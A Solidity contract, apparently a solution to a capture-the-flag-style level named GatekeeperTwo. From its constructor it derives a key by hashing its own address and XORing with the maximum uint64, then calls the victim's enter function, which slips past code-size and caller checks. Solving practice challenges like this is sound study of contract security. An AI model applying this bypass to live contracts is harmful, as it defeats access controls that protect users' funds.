// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";
import "./GatekeeperTwo.sol";

contract AttackGatekeeperTwo {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        key = key ^ (uint64(0) - 1);

        (bool result, ) = _victim.call(
            abi.encodeWithSignature(("enter(bytes8)"), bytes8(key))
        );
    }

    //     function attack() public {

    //     }
}
